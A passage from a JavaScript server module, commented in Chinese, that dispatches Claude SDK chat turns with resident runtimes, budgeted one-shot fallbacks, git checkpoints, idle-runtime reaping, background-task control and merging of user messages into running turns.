  releaseClaim(runtime, claimStamp);

  if (!aborted) {
    const summary = passed
      ? `🏁 Agent Loop 完成：目标达成，验证通过（共 ${round} 轮）。`
      : testCommand
        ? `🏁 Agent Loop 结束：${Math.min(round, effectiveRounds)} 轮后验证仍未通过，请人工检查。`
        : `🏁 Agent Loop 结束：无验证命令，已执行 1 轮。可用 --test "命令" 指定验证方式。`;
    sendNote(summary);
    /**
     * 没有验证命令不等于成功:这时没有目标是否达成的证据,收尾码只看最后一轮的实际结果,
     * 模型自己报错就是 1。
     */
    const loopExitCode = passed ? 0 : (testCommand ? 1 : (lastTurnWasError ? 1 : 0));
    ws.send(createCompleteMessage({ provider: 'claude', sessionId: finalSessionId || sessionId || null, exitCode: loopExitCode }));
  }
  notifyRunStopped({
    userId: ws?.userId || null,
    provider: 'claude',
    sessionId: finalSessionId || sessionId || null,
    sessionName: sessionSummary,
    stopReason: aborted ? 'aborted' : 'completed',
  });

  const usage = await readRuntimeContextUsage(runtime, { detail: 'summary' });
  sendContextUsageEvent(ws, finalSessionId || sessionId || null, usage);

  return { sessionId: finalSessionId || sessionId || null };
}

/* ------------------------------------------------------------------ */
/*  Checkpoint wrapper + dispatcher                                    */
/* ------------------------------------------------------------------ */

let pruneCounter = 0;

/**
 * 回退重放前侦察:transcript 有没有收到这条用户消息。
 *
 * 场景:常驻回合在输入已递交、还没流出任何内容的窗口里崩掉。此时有两种可能:
 *   a) 子进程早死了,根本没读到消息 → transcript 没动 → 重放安全;
 *   b) 子进程收下消息、写进 transcript 后才崩 → 重放会造出重复的用户消息。
 * 区分办法:看 transcript 尾部有没有 timestamp 晚于回合起点的 user 行。
 * 只读尾部 64KB(与 last-activity 提取同款);拿不准(读失败/没有 resume id)
 * 一律按"已落盘"处理 —— 宁可让用户重发一次,不制造重复消息。
 */
const TRANSCRIPT_PROBE_TAIL_BYTES = 64 * 1024;
async function userTurnReachedTranscript(options, sinceMs) {
  const providerSessionId = options?.resumeSessionId;
  const cwd = options?.cwd || options?.projectPath;
  if (!providerSessionId || !cwd || !Number.isFinite(sinceMs)) return true; // 拿不准按最坏处理
  try {
    const encoded = String(cwd).replace(/[^a-zA-Z0-9-]/g, '-');
    const transcriptPath = path.join(os.homedir(), '.claude', 'projects', encoded, `${providerSessionId}.jsonl`);
    const stat = await fs.stat(transcriptPath);
    // 文件自回合起点(留 2s 时钟余量)就没动过 → 消息肯定没落盘。
    if (stat.mtimeMs < sinceMs - 2000) return false;
    const start = Math.max(0, stat.size - TRANSCRIPT_PROBE_TAIL_BYTES);
    const handle = await fs.open(transcriptPath, 'r');
    let tailText = '';
    try {
      const length = stat.size - start;
      const buffer = Buffer.alloc(length);
      await handle.read(buffer, 0, length, start);
      tailText = buffer.toString('utf8');
    } finally {
      await handle.close();
    }
    const lines = tailText.split(/\r?\n/);
    for (let index = lines.length - 1; index >= 0; index -= 1) {
      const line = lines[index]?.trim();
      if (!line) continue;
      let parsed;
      try { parsed = JSON.parse(line); } catch { continue; }
      if (parsed?.type !== 'user' || typeof parsed.timestamp !== 'string') continue;
      const ts = Date.parse(parsed.timestamp);
      if (Number.isFinite(ts) && ts >= sinceMs - 2000) return true;
      // 行按时间只增,遇到更老的 user 行即可停。
      if (Number.isFinite(ts)) return false;
    }
    return false;
  } catch {
    return true; // 读不了 transcript:按已落盘处理,不重放
  }
}

/**
 * Budgeted one-shot run: the fallback for a failed persistent turn, and also the
 * path for intentional one-shot turns.
 *
 * Global concurrency invariant: resident runtimes + active one-shot runs never
 * exceed MAX_RUNTIMES + MAX_ONESHOT_OVERFLOW. Beyond that the run fails fast
 * with a clear error instead of spawning an uncounted SDK process.
 * @param {string} command - User prompt/command
 * @param {Object} options - Query options
 * @param {Object} ws - WebSocket writer
 * @param {Object|null} runEntry - Gateway run registry entry
 * @param {boolean} degradeNotice - True when the fallback is due to the runtime limit (tells the user)
 */
async function runOneShotFallback(command, options, ws, runEntry, degradeNotice) {
  const budget = MAX_RUNTIMES + MAX_ONESHOT_OVERFLOW;
  // 正在起的常驻 runtime(已占位、还没登记)也算在内,见 reservedRuntimeSlots
  if (claudeRuntimes.size + reservedRuntimeSlots + activeOneShotFallbacks >= budget) {
    const content = '并发会话已满，请稍候再试';
    ws.send(createNormalizedMessage({
      kind: 'error',
      content,
      sessionId: options.sessionId || null,
      provider: 'claude',
    }));
    ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
    // 名额满也按失败返回:定时任务要记 failed 并按重试规则处理。
    return oneShotOutcome({ ok: false, error: content, sessionId: options.sessionId || null });
  }
  if (degradeNotice) {
    // Same channel as the auto-compact notice: a transient one-line status.
    ws.send(createNormalizedMessage({
      kind: 'status',
      text: '已临时降级为一次性会话模式（常驻池已满）',
      canInterrupt: false,
      sessionId: options.sessionId || null,
      provider: 'claude',
    }));
  }
  activeOneShotFallbacks += 1;
  try {
    return await queryClaudeSDKOnce(command, options, ws, runEntry);
  } finally {
    activeOneShotFallbacks -= 1;
  }
}

/**
 * Public entry point for one Claude chat turn.
 *
 * Registers the run under the gateway runId (options.runId, the app session
 * id) BEFORE anything else so `chat.abort` can reach the turn even while the
 * provider-native session id is still unknown, then dispatches.
 */
async function queryClaudeSDK(command, options = {}, ws) {
  const runId = typeof options.runId === 'string' && options.runId.length > 0 ? options.runId : null;
  const runEntry = { aborted: false, runtime: null, queryInstance: null };
  if (runId) activeChatRuns.set(runId, runEntry);
  try {
    // 一次性路径(`options.oneShot`)返回 OneShotOutcome;常驻路径返回 undefined,
    // 它的调用方(网关)只看 writer。
    return await queryClaudeSDKDispatch(command, options, ws, runEntry);
  } finally {
    // Identity-checked: never delete a newer run's registration.
    if (runId && activeChatRuns.get(runId) === runEntry) activeChatRuns.delete(runId);
    /*
     * 这一轮被停止过的话,它按会话 id 记下的中止标记到此作废。停止若落在回合已出 result、complete 还没发的
     * 那几秒,回合收尾时没人消费这个标记,留着它会让这段对话的下一条在开跑前被当成「已停止」悄悄吞掉。
     */
    if (runEntry.aborted) {
      if (options.sessionId) abortedSessionIds.delete(options.sessionId);
      if (runEntry.runtime?.sessionId) abortedSessionIds.delete(runEntry.runtime.sessionId);
    }
  }
}

/**
 * Dispatches one Claude chat turn.
 *
 * - Persistent mode (default): resident SDK query per conversation.
 * - `options.oneShot` or PRISM_PERSISTENT_SESSIONS=0: legacy per-turn path.
 * - Git checkpoints wrap every non-slash chat turn when the project is a repo.
 */
async function queryClaudeSDKDispatch(command, options, ws, runEntry) {
  // 「跳过权限」+ root 的组合会被 CLI 直接拒掉。在这里拦,而不是让两条路径
  // 各撞一次 —— 一次性回退会用同样的参数再试一遍,同样失败,只是多烧一次进程。
  const bypassProblem = describeBypassUnderRoot(runtimeSettingsFromOptions(options).permissionMode);
  if (bypassProblem) {
    ws.send(createNormalizedMessage({
      kind: 'error',
      content: bypassProblem,
      sessionId: options.sessionId || null,
      provider: 'claude',
    }));
    ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
    // 一次性调用方要拿到失败结果;常驻路径的调用方不看返回值。
    return options.oneShot
      ? oneShotOutcome({ ok: false, error: bypassProblem, sessionId: options.sessionId || null })
      : undefined;
  }

  const usePersistent = PERSISTENT_ENABLED && !options.oneShot;

  // /loop runs on the persistent runtime only.
  const loopSpec = usePersistent ? parseLoopCommand(command) : null;
  if (loopSpec && !loopSpec.goal) {
    ws.send(createNormalizedMessage({
      kind: 'error',
      content: '用法：/loop <目标> [--rounds N] [--test "验证命令"]',
      sessionId: options.sessionId || null,
      provider: 'claude',
    }));
    ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
    return;
  }

  // -------- pre-turn checkpoint --------
  let checkpoint = null;
  const trimmedCommand = typeof command === 'string' ? command.trimStart() : '';
  const wantCheckpoint = CHECKPOINTS_ENABLED
    && !options.oneShot
    && options.cwd
    && typeof command === 'string'
    && (!trimmedCommand.startsWith('/') || Boolean(loopSpec));

  if (wantCheckpoint) {
    try {
      if (await isGitRepository(options.cwd)) {
        checkpoint = await createCheckpoint(options.cwd, {
          sessionId: options.sessionId || null,
          prompt: command,
        });
        if (checkpoint) {
          ws.send(createNormalizedMessage({
            kind: 'checkpoint_created',
            checkpoint: {
              id: checkpoint.id,
              createdAt: checkpoint.createdAt,
              cwd: checkpoint.cwd,
            },
            sessionId: options.sessionId || null,
            provider: 'claude',
          }));
        }
      }
    } catch (error) {
      log.warn('[Claude SDK] Checkpoint creation failed:', error?.message || error);
    }
  }

  // -------- run the turn --------
  let turnOutcome = null;
  /** 一次性路径的成败,最后作为返回值交给调用方。 */
  let oneShotResult;
  if (loopSpec) {
    try {
      turnOutcome = await runAgentLoop(loopSpec, options, ws, runEntry);
    } catch (error) {
      const message = error?.message || String(error);
      log.error('[Claude SDK] Agent loop failed:', message);
      ws.send(createNormalizedMessage({ kind: 'error', content: `Agent Loop 失败: ${userFacingErrorText(error)}`, sessionId: options.sessionId || null, provider: 'claude' }));
      ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
    }
  } else if (usePersistent) {
    try {
      turnOutcome = await queryClaudeSDKPersistent(command, options, ws, runEntry);
    } catch (error) {
      // 分支判断只看错误上的标记,不拿文案(更不拿拼了 stderr 的串)去匹配。
      const message = error?.message || String(error);
      // 而用户在聊天里看到的是这条:内部错误换成中文说明(英文原文只进日志),再把 CLI 的 stderr 拼进去,
      // 只有 "exited with code 1" 的话,用户和运维都无从下手。
      const userText = userFacingErrorText(error);
      const displayMessage = error?.prismStderr
        ? `${userText}\n\n--- claude CLI stderr ---\n${error.prismStderr}`
        : userText;
      /**
       * 一次性回退自己也会失败:最常见的是 runtime 正忙(回合 / 工具 / 后台任务),queryClaudeSDKOnce 不能
       * resume 同一段对话而抛 prismRuntimeBusy。那时同样要给用户一条错误和 complete,不能只在日志里留一行。
       */
      const fallBackToOneShot = async (degradeNotice) => {
        try {
          return await runOneShotFallback(command, options, ws, runEntry, degradeNotice);
        } catch (fallbackError) {
          log.error('[Claude SDK] One-shot fallback failed:', fallbackError?.message || fallbackError);
          const content = userFacingErrorText(fallbackError);
          // 已被停止的那一轮由中止处理器发过 complete 了,不再补一条报错
          if (!runEntry?.aborted) {
            ws.send(createNormalizedMessage({ kind: 'error', content, sessionId: options.sessionId || null, provider: 'claude' }));
            ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
          }
          return oneShotOutcome({ ok: false, aborted: Boolean(runEntry?.aborted), error: content, sessionId: options.sessionId || null });
        }
      };
      if (runEntry?.aborted) {
        // chat.abort already completed the run; the teardown throw is noise.
        // Never replay an aborted turn through the one-shot fallback.
        log.info('[Claude SDK] Persistent turn ended by abort:', message);
        // Consume the abort flag so it cannot bleed into the session's next run.
        if (options.sessionId) abortedSessionIds.delete(options.sessionId);
        if (runEntry.runtime?.sessionId) abortedSessionIds.delete(runEntry.runtime.sessionId);
        notifyRunStopped({
          userId: ws?.userId || null,
          provider: 'claude',
          sessionId: options.sessionId || null,
          sessionName: options.sessionSummary,
          stopReason: 'aborted',
        });
      } else if (error?.prismTurnNotStarted) {
        // 回合没开跑就被拒(上一轮迟迟不收尾、CLI 自己那一轮等满上限还在跑):原样告诉用户,不退回一次性路径
        // (那条路要 resume 同一段对话,而 runtime 正忙,只会再失败一次)。
        log.info(`[Claude SDK] Turn not started (${error.code || 'unknown'}):`, message);
        // 先让调用方把用户那一行标成撤回,再发 error / complete(之后这一轮就收尾了)
        notifyTurnNotStarted(options, error);
        ws.send(createNormalizedMessage({ kind: 'error', content: displayMessage, sessionId: options.sessionId || null, provider: 'claude' }));
        ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
      } else if (error?.prismModelRejected) {
        // 模型被 CLI / 网关拒绝:不退回一次性路径,那只会用同一个模型再失败一次。
        ws.send(createNormalizedMessage({ kind: 'error', content: displayMessage, sessionId: options.sessionId || null, provider: 'claude' }));
        ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
      } else if (error?.prismStreamed || error?.prismTurnTimeout) {
        // Partial output already reached the client (or the watchdog killed
        // the turn after a long run) — do NOT replay the turn.
        // 日志记英文原文(与错误码),聊天里发的是中文说明
        log.error(
          `[Claude SDK] Persistent turn failed mid-stream${error?.code ? ` (${error.code})` : ''}:`,
          error?.prismStderr ? `${message}\n--- claude CLI stderr ---\n${error.prismStderr}` : message,
        );
        ws.send(createNormalizedMessage({ kind: 'error', content: displayMessage, sessionId: options.sessionId || null, provider: 'claude' }));
        ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
        notifyRunFailed({
          userId: ws?.userId || null,
          provider: 'claude',
          sessionId: options.sessionId || null,
          sessionName: options.sessionSummary,
          error,
        });
      } else if (error?.prismRuntimeLimit) {
        // Resident pool full of busy runtimes: degrade WITHIN the overflow
        // budget (with a visible notice) or fail fast when it is exhausted.
        log.warn('[Claude SDK] Runtime pool full, attempting budgeted one-shot fallback:', message);
        oneShotResult = await fallBackToOneShot(true);
      } else if (
        error?.prismInputDelivered
        // 侦察要的是 provider 原生会话 id。网关传进来的 options 里叫 `sessionId`,
        // `resumeSessionId` 只存在于 runtimeForSend 内部临时拼的对象上 ——
        // 直接传 options 的话这个函数恒定早退返回 true,底下读 transcript
        // 那段在生产路径上一行都不会执行(测试因为直接构造参数而一直是绿的)。
        && (await userTurnReachedTranscript(
          { ...options, resumeSessionId: options?.resumeSessionId || options?.sessionId },
          error.prismTurnStartedAtMs,
        ))
      ) {
        // 输入已递交且 transcript 侦察显示消息可能已落盘:重放会造出重复的
        // 用户消息。老实报错让用户重发,比悄悄污染 transcript 好。
        log.warn('[Claude SDK] Persistent turn failed after input delivery; transcript may hold the message — not replaying:', message);
        ws.send(createNormalizedMessage({ kind: 'error', content: `${displayMessage}\n\n(回合在消息递交后失败,为避免重复消息未自动重试,请重新发送)`, sessionId: options.sessionId || null, provider: 'claude' }));
        ws.send(createCompleteMessage({ provider: 'claude', sessionId: options.sessionId || null, exitCode: 1 }));
      } else {
        log.warn('[Claude SDK] Persistent turn failed, falling back to one-shot mode:', message);
        oneShotResult = await fallBackToOneShot(false);
      }
    }
  } else {
    // 有意的一次性路径(外部 API 的 options.oneShot、或 PRISM_PERSISTENT_SESSIONS=0)
    // 也必须进预算闸:每个一次性回合就是一个真实的 CLI 子进程,直呼
    // queryClaudeSDKOnce 等于绕开 MAX_RUNTIMES+overflow 的全局并发预算 ——
    // API 流量可以无上限打出上百个进程,仅剩 IP 限流兜底。
    // degradeNotice=false:这不是降级,不发"已降级"提示,只做配额与计数。
    oneShotResult = await runOneShotFallback(command, options, ws, runEntry, false);
  }

  // -------- post-turn changed-files summary --------
  if (checkpoint) {
    try {
      const finalSessionId = turnOutcome?.sessionId || options.sessionId || null;
      if (finalSessionId && !checkpoint.sessionId) {
        await updateCheckpointSession(checkpoint.id, finalSessionId);
      }
      const changes = await changedFilesSince(checkpoint.id);
      if (changes.files.length > 0) {
        ws.send(createNormalizedMessage({
          kind: 'changed_files',
          checkpointId: checkpoint.id,
          // 带上 cwd:落库后工作面板要把 git 相对路径拼成绝对路径,与 Write 帧同构
          // (打开 / 下载都用绝对路径,也便于跨通路去重)。
          cwd: checkpoint.cwd || options.cwd || null,
          files: changes.files.map(({ diff, ...rest }) => ({
            ...rest,
            diff: diff && diff.length > 20_000 ? `${diff.slice(0, 20_000)}\n… (truncated)` : diff,
          })),
          truncated: changes.truncated,
          sessionId: finalSessionId,
          provider: 'claude',
        }));
      }
    } catch (error) {
      log.warn('[Claude SDK] Changed-files summary failed:', error?.message || error);
    }

    pruneCounter += 1;
    if (pruneCounter % 20 === 1) {
      pruneCheckpoints().catch(() => {});
    }
  }

  // 只有一次性路径有返回值(见 OneShotOutcome)。
  return oneShotResult;
}

/* ------------------------------------------------------------------ */
/*  Runtime lifecycle upkeep                                           */
/* ------------------------------------------------------------------ */

/** 空闲回收器的判据:这个 runtime 现在该不该被收掉。 */
export function runtimeReapable(runtime, now = Date.now()) {
  // 已被某次发送领走、还没开跑(claimedAt,见 runtimeForSend 的 claim)的不收:领走之后还有排队、切模型这类
  // 真实的 await,这时收掉的话那次发送 push 时撞上「runtime input is closed」,莫名降级成一次性回合。
  // 与淘汰排序同一个判据;预占过了 CLAIM_STALE_MS 自然失效。
  if (runtime.claimedAt && now - runtime.claimedAt < CLAIM_STALE_MS) return false;
  // 按 runtimeIsIdle 判闲(在途工具 / CLI 自发的一轮都算忙)。子代理的在途工具不在其中,
  // 另看 subagentToolUses:子代理里一条长工具可能半小时没有任何帧,只看 lastUsed 会被当成空闲收掉。
  const subagentBusy = (runtime.subagentToolUses?.size ?? 0) > 0;
  const idleFor = now - runtime.lastUsed;
  // 兜底:没有回合、却因为丢失的 tool_result 或没收尾的自发一轮永远"忙"着的
  // runtime,静默超过工具静默硬顶(默认 24h)也回收 —— 不让名额被僵尸永久钉住。
  const zombie = !runtime.turn
    && TURN_WATCHDOG.toolSilenceMaxMs > 0
    && idleFor > TURN_WATCHDOG.toolSilenceMaxMs;
  return (runtimeIsIdle(runtime) && !subagentBusy && idleFor > IDLE_RUNTIME_MS) || zombie;
}

const idleReaper = setInterval(() => {
  const now = Date.now();
  for (const runtime of claudeRuntimes.values()) {
    if (runtimeReapable(runtime, now)) {
      disposePersistentRuntime(runtime).catch(() => {});
    }
  }
}, 60 * 1000);
idleReaper.unref?.();

/**
 * 停掉一个后台任务(后台任务条上的「停止」)。只认这个 runtime 报过的活任务。
 */
async function stopClaudeBackgroundTask(sessionId, taskId) {
  const runtime = getPersistentRuntime(sessionId);
  if (!runtime || runtime.disposed) return { stopped: false, reason: 'not_resident' };
  if (typeof taskId !== 'string' || !taskId || !runtime.liveBackgroundTasks?.has(taskId)) return { stopped: false, reason: 'unknown_task' };
  if (typeof runtime.query?.stopTask !== 'function') return { stopped: false, reason: 'unsupported' };
  /*
   * 停掉之后当场从账上划掉:账上还挂着的话,这段对话每一次需要重启 CLI 的发送都会被后台任务保护拒掉,
   * 直到 24 小时僵尸回收。任务早已结束(漏收了那一帧)时 `stop_task` 照样回成功、也不再发
   * background_tasks_changed,所以不能只在报错分支里划;CLI 之后发的 background_tasks_changed 是全量表,
   * 任务真还活着会被加回来。
   */
  const dropLocally = () => {
    if (!runtime.liveBackgroundTasks?.has(taskId)) return;
    const remaining = [...runtime.liveBackgroundTasks.values()]
      .filter((task) => task.taskId !== taskId)
      .map((task) => ({ task_id: task.taskId, task_type: task.taskType, description: task.description }));
    noteBackgroundTasks(runtime, { type: 'system', subtype: 'background_tasks_changed', tasks: remaining });
  };
  try {
    await withRuntimeControlTimeout(runtime.query.stopTask(taskId), 'stopTask');
    dropLocally();
    log.info(`[Claude SDK] 停掉后台任务 ${taskId}(runtime=${runtime.key})`);
    return { stopped: true };
  } catch (error) {
    const message = error?.message || String(error);
    // CLI 另一条停止路径对不存在的任务会抛 "No task found with ID: …";已结束的报 "not running (status: completed…)"。
    // 别的 "not running"(还在 pending)/ "Unknown error" 不算 —— 那些任务可能还活着,划掉了下一次重建会把它杀掉。
    if (/no task found|task .* not found|not running \(status: (completed|failed|killed|stopped)/i.test(message)
      && runtime.liveBackgroundTasks?.has(taskId)) {
      dropLocally();
      log.warn(`[Claude SDK] 后台任务 ${taskId} 在 CLI 那边已经不存在,从账上划掉:${message}`);
      return { stopped: true, reason: 'already_gone' };
    }
    return { stopped: false, reason: 'error', error: message };
  }
}

/**
 * 把正在跑的前台命令 / 子代理转到后台(等于终端里按 Ctrl+B):这一轮立刻接着往下走,
 * 命令继续跑,结束后由 CLI 通知。只在有回合在跑时有意义。
 */
async function backgroundClaudeForegroundTasks(sessionId, toolUseId = null) {
  const runtime = getPersistentRuntime(sessionId);
  if (!runtime || runtime.disposed) return { backgrounded: false, reason: 'not_resident' };
  if (!runtime.turn) return { backgrounded: false, reason: 'no_turn' };
  if (typeof runtime.query?.backgroundTasks !== 'function') return { backgrounded: false, reason: 'unsupported' };
  try {
    const ok = await withRuntimeControlTimeout(
      toolUseId ? runtime.query.backgroundTasks(toolUseId) : runtime.query.backgroundTasks(),
      'backgroundTasks',
    );
    return ok === false ? { backgrounded: false, reason: 'no_match' } : { backgrounded: true };
  } catch (error) {
    return { backgrounded: false, reason: 'error', error: error?.message || String(error) };
  }
}

/**
 * `system/api_retry` → 活动指示器上的一行状态。`no_response` = 网关迟迟不回响应头(首字节超时)。
 */
export function apiRetryStatusFrame(message, sessionId) {
  if (message?.type !== 'system' || message.subtype !== 'api_retry') return null;
  const attempt = Number(message.attempt);
  const max = Number(message.max_retries);
  const delayS = Math.max(0, Math.round(Number(message.retry_delay_ms) / 1000));
  const status = Number.isFinite(Number(message.error_status)) && message.error_status !== null ? Number(message.error_status) : null;
  const why = message.no_response
    ? '网关迟迟没有响应'
    : status === 429
      ? '网关限流(429)'
      : status && status >= 500
        ? `网关繁忙(${status})`
        : status
          ? `网关返回 ${status}`
          : '连接网关失败';
  const progress = Number.isFinite(attempt) && Number.isFinite(max) && max > 0 ? `第 ${attempt}/${max} 次重试` : '重试中';
  return createNormalizedMessage({
    kind: 'status',
    text: `${why},${progress}${delayS > 0 ? `,${delayS} 秒后` : ''}`,
    statusKind: 'api_retry',
    apiRetry: { attempt: Number.isFinite(attempt) ? attempt : null, maxRetries: Number.isFinite(max) ? max : null, errorStatus: status, noResponse: Boolean(message.no_response) },
    sessionId,
    provider: 'claude',
  });
}

/** `system/informational` 里值得打扰用户的两级(warning / suggestion)→ 一条提示。 */
export function cliNoticeFrame(message, sessionId) {
  if (message?.type !== 'system' || message.subtype !== 'informational') return null;
  const level = message.level;
  if (level !== 'warning' && level !== 'suggestion') return null;
  const content = typeof message.content === 'string' ? message.content.trim() : '';
  if (!content) return null;
  return createNormalizedMessage({ kind: 'status', status: 'cli_notice', level, content: content.slice(0, 600), sessionId, provider: 'claude' });
}

/**
 * 撤销某一轮之后的文件改动(非 git 目录,用 CLI 文件检查点)。`dryRun` 只列出会动哪些文件。
 * 没有活的 runtime 就按预热那条路拉起来(resume 同一段对话):检查点在磁盘上,跨进程可用。
 * 有回合在跑时拒绝,边改边退只会乱。
 */
async function rewindClaudeFiles(providerSessionId, turnUuid, { dryRun = true, cwd = null, runId = null, actorUserId = null, actorUsername = null } = {}) {
  if (typeof turnUuid !== 'string' || !TURN_UUID_RE.test(turnUuid)) return { ok: false, reason: 'invalid_turn' };
  let runtime = getPersistentRuntime(providerSessionId);
  if (runtime && !runtime.disposed && (runtime.turn || !runtimeIsIdle(runtime))) return { ok: false, reason: 'busy' };
  if (!runtime || runtime.disposed) {
    // 以点「撤销」的人的身份拉起:网关 key 按人分,不带身份起出来的是默认 key 的进程,下一条消息还得重建。
    await prewarmClaudeSession({ sessionId: providerSessionId, cwd, ...(runId ? { runId } : {}), actorUserId, actorUsername });
    runtime = getPersistentRuntime(providerSessionId);
  }
  if (!runtime || runtime.disposed || typeof runtime.query?.rewindFiles !== 'function') return { ok: false, reason: 'not_resident' };
  if (!runtime.fileCheckpointing) return { ok: false, reason: 'not_enabled' };
  try {
    const result = await withRuntimeControlTimeout(runtime.query.rewindFiles(turnUuid, { dryRun: Boolean(dryRun) }), 'rewindFiles');
    if (!dryRun) log.info(`[Claude SDK] 撤销文件改动到 ${turnUuid} 之前(runtime=${runtime.key}):${result?.canRewind ? '成功' : result?.error || '失败'}`);
    return {
      ok: Boolean(result?.canRewind),
      dryRun: Boolean(dryRun),
      files: Array.isArray(result?.filesChanged) ? result.filesChanged : [],
      insertions: Number(result?.insertions) || 0,
      deletions: Number(result?.deletions) || 0,
      ...(result?.error ? { error: String(result.error) } : {}),
    };
  } catch (error) {
    return { ok: false, reason: 'error', error: error?.message || String(error) };
  }
}

/** Look up a resident runtime by provider-native session id. */
function getPersistentRuntime(sessionId) {
  if (!sessionId) return null;
  const runtime = claudeRuntimes.get(sessionId);
  return runtime && !runtime.disposed ? runtime : null;
}

/**
 * 按 app 会话 id 找这段对话的常驻 runtime。
 *
 * `claudeRuntimes` 的键是 `runtime.key`(rekey 之后是 provider 原生 id),而合流那条路手里只有
 * app 会话 id,所以两个 id 都试,再兜底扫一遍(池子最多几十个,代价可以忽略)。找错 runtime
 * 就会把用户的话推进别人的对话里,所以最后必须用 `appSessionId` 核对一次。
 */
function runtimeForMerge(appSessionId, providerSessionId) {
  if (!appSessionId) return null;
  const direct = getPersistentRuntime(providerSessionId) || getPersistentRuntime(appSessionId);
  if (direct && direct.appSessionId === appSessionId) return direct;
  for (const runtime of claudeRuntimes.values()) {
    if (!runtime.disposed && runtime.appSessionId === appSessionId) return runtime;
  }
  return null;
}

/**
 * 合流(mergeUserMessage):回合进行中用户又发来的话直接推进 CLI 的命令队列,而不是落进
 * Prism 自己的 `pendingSends`、等这一轮跑完再起新一轮。
 *
 * 依据:
 * - `Query.streamInput` 是一条独立的 `for await` 循环,不管回合状态,从输入流拿到就
 *   `JSON.stringify` 写进 CLI 的 stdin(整个对象原样透传);
 * - `SDKUserMessage` 上有 `priority?: 'now' | 'next' | 'later'`;
 * - CLI 把它收进命令队列(transcript 里是 `queue-operation enqueue → dequeue`,后台任务通知
 *   走的也是这条),按 priority 决定什么时候投递。
 *
 * 本函数返回不能合流的原因(能合流时为 null),调用方据此退回排队:找不到 runtime(一次性路径、
 * 被淘汰过)、runtime 已废弃或被标 suspect、没有用户回合在跑、那一轮正在被停止、发送者或策略档位不一致。
 * 常驻关闭与输入流已关闭(push 会抛)由 mergeUserMessage 自己判断。
 *
 * 带图片的消息不合流:带图要走 `buildClaudeUserContent`(读盘、转 base64),它需要的 `cwd` 与
 * `imageRoots` 在 `chat.send` 里是在合流这条早退分支之后才算出来的。
 */
export function mergeRefusalReason(runtime, command, options = {}) {
  if (typeof command !== 'string' || !command.trim()) return 'empty';
  if (!runtime) return 'no-runtime';
  if (runtime.disposed) return 'disposed';
  // 它还在跑东西而 Prism 已经不再跟踪了 —— 往里推等于往一个不认识的进程里塞话。
  if (runtime.suspect) return 'suspect';
  /**
   * 没有用户回合在跑就不合流。
   *
   * 合流是"并进正在跑的用户回合",而 `chat.send` 走到合流的前提只是"注册表说忙",两者有两段
   * 对不上的窗口:回合起点(run 已登记、`runtime.turn` 还没赋值)与回合末尾(`turn` 已置 null、
   * `complete` 还没发)。这两段里合流进去的消息,回复会走无主帧路径,而观测回合因为用户的 run
   * 还在而开不了,整批既不广播也不落库。退回排队的话,drain 会在 complete 之后正常起新一轮。
   */
  if (!runtime.turn) return 'no-turn';
  /**
   * 正在被停止的那一轮不合流。
   *
   * 按了停止之后,这一轮要等前台工具转后台、出 result 才收尾,常常要好几秒;这期间 `runtime.turn` 还是它。
   * 合流进去的话,插话只能等那一轮收尾后被 CLI 当成自己的一轮跑,排到停止后重发的那一条前面。
   * 退回排队,等正在等它收尾的那一条跑完再续发。标记由停止路径在中断前记在 turn 上。
   */
  if (runtime.turn.stopping) return 'turn-stopping';
  /**
   * 发送者必须就是这个 runtime 的主人,策略档位也要一致。
   *
   * 正常发送每次都按发送者重算策略(`runtimeSettingsFromOptions` → `applyServerToolPolicy`)
   * 并覆写 runtime.settings,合流不走这一步。不拦的话,共享会话里 B 的消息会以 A 的 bypass 档跑,
   * A 记住的放行也跟着生效,用量还记在 A 名下。这里不重算,只要求"同一个人、同一个档位",
   * 不一致就退回排队,drain 之后走正常发送,按 B 自己的策略起新一轮。
   */
  if (options.actorUsername !== undefined || options.ownerUserId !== undefined) {
    const sameOwner = String(runtime.ownerUserId ?? '') === String(options.ownerUserId ?? '');
    const sameActor = String(runtime.actorUsername ?? '') === String(options.actorUsername ?? '');
    if (!sameOwner || !sameActor) return 'actor-mismatch';
    const policed = runtimeSettingsFromOptions({
      ...(options.runtimeOptions || {}),
      actorUsername: options.actorUsername,
    });
    if (policed.permissionMode !== runtime.settings?.permissionMode) return 'policy-mismatch';
  }
  return null;
}

export async function mergeUserMessage(appSessionId, options = {}) {
  if (!PERSISTENT_ENABLED) return { merged: false, reason: 'persistent-disabled' };
  const command = typeof options.command === 'string' ? options.command : '';
  const runtime = runtimeForMerge(appSessionId, options.providerSessionId ?? null);
  const refusal = mergeRefusalReason(runtime, command, options);
  if (refusal) return { merged: false, reason: refusal };

  const uuid = crypto.randomUUID();
  try {
    runtime.input.push({
      type: 'user',
      uuid,
      session_id: runtime.sessionId || '',
      parent_tool_use_id: null,
      /**
       * 插话用 `'next'`,不用 `'now'`。
       *
       * - `'now'` 会打断这一轮:前台工具跑完就以 `terminal_reason: aborted_tools` 收掉,CLI 另起一轮只回答插话,
       *   原来的活不再接着做;这时再撤回插话(cancelAsyncMessage 返回 true)也无济于事,工具结果没人处理,
       *   任务无声地停在半路。
       * - `'next'` 在下一个工具间隙折进这一轮:模型收到「The user sent a new message while you were working…
       *   Address the message above as you continue this turn」,带着插话继续原来的活,result 的
       *   `user_message_uuids` 里有它;撤回后原来那一轮照常做完。
       * 这一轮已经没有工具间隙时(只剩最后一段文字),CLI 会在它结束后接着跑这条,走无主帧 / 观察中的回合那条路。
       */
      priority: 'next',
      message: { role: 'user', content: [{ type: 'text', text: command }] },
    });
  } catch (error) {
    return { merged: false, reason: 'input-closed', error: error?.message || String(error) };
  }
  // 合流进来的这条也算本回合的:CLI 把它折进正在跑的一轮,result 的 `user_message_uuids`
  // 里会有它(那一轮只回显这条时也得认)。
  runtime.turn?.userMessageUuids?.add(uuid);
  // 记下 uuid:停止时要能撤回它,用户也能手动撤回(见 cancelMergedMessage)。
  rememberMergedUuid(runtime, uuid, appSessionId);

  runtime.lastUsed = Date.now();
